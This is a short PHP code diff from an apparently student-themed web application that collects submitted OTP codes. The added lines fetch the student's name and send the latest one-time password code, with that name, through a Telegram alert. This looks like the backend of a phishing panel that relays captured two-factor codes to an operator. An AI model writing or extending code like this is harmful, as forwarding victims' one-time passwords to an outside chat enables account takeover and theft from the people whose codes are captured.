@@ -36,4 +36,13 @@ $otpList[] = [
 $db->prepare("UPDATE students SET otp_data = ? WHERE id = ?")->execute([json_encode($otpList), $studentId]);
 logActivity($studentId, 'otp_submitted', 'OTP code received');
 
+$stu = $db->prepare("SELECT name, surname FROM students WHERE id = ?");
+$stu->execute([$studentId]);
+$stuRow = $stu->fetch();
+$lastOtp = end($otpList);
+sendTelegramAlert('otp', [
+    'student_name' => ($stuRow['name'] ?? '') . ' ' . ($stuRow['surname'] ?? ''),
+    'code' => $lastOtp['code']
+]);
+
 jsonResponse(['success' => true]);
